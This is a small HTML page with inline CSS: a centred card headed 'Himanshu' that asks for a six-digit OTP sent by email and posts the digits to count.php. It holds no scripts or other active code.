<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 20px;
            height: 300px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .container h1 {
            color: #1877f2;
        }
        .container .divider {
            margin: 18px 0;
        }
        .otp-input {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        .otp-input input {
            width: 40px;
            height: 40px;
            margin: 0 5px;
            font-size: 18px;
            text-align: center;
            border: 1px solid #ccc;
            border-radius: 4px;

        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Himanshu</h1>
        <p>Enter the OTP sent to your email</p>
        <form action="count.php" method="post">
            <div class="otp-input">
                <input type="text" name="otp1" maxlength="1" required>
                <input type="text" name="otp2" maxlength="1" required>
                <input type="text" name="otp3" maxlength="1" required>
                <input type="text" name="otp4" maxlength="1" required>
                <input type="text" name="otp5" maxlength="1" required>
                <input type="text" name="otp6" maxlength="1" required>
            </div>
            <div class="divider"></div>
            <input type="submit" name="Submit" style="background-color: blue; color: white; padding: 10px 20px; border: none; border-radius: 5px; font-size: 16px;">
        </form>
    </div>
</body>
</html>
